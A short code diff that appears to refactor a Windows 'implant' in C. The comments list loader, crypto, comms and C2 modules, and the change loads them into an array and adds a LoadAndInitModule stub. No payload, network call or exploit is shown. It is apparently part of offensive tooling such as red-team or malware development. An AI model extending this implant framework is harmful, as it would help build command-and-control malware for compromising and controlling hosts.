@@ -11,7 +11,11 @@ wmain(INT argc, PWSTR argv[])
 	/*
 	* Implant should:
 	*	1. Load embedded modules from resources
-	*	2. Load comms module using loader
+	*	2. Ensure the following required modules are loaded and initialized:
+	*		a. Loader
+	*		b. Crypto
+	*		c. Comms
+	*		d. C2
 	*/
 	IMPLANT_CONFIG ImplantConfig = { 0 };
 	LOADED_MODULE lmLoader = { 0 },
@@ -19,8 +23,10 @@ wmain(INT argc, PWSTR argv[])
 	PVOID pCommModule = NULL;
 	DWORD dwCommModuleSize = 0;
 	MODULE_INIT fnInit = NULL;
+	LOADED_MODULE aLoadedModules[MIRM_NUM_REQUIRED_MODULES] = { 0 };
 	
-	if (FALSE == LoadEmbeddedLoader(&lmLoader) || NULL == lmLoader.hModule)
+	if (FALSE == LoadEmbeddedLoader(&aLoadedModules[MIRM_Loader])
+			|| NULL == aLoadedModules[MIRM_Loader].hModule)
 	{
 		LOG_ERROR("LoadEmbeddedLoader failed");
 		return EXIT_FAILURE;
@@ -286,3 +292,9 @@ GetResourceData(
 
 	return TRUE;
 }
+
+BOOL
+LoadAndInitModule(
+	PIMPLANT_CONFIG pImplantConfig,
+	INT i
+)
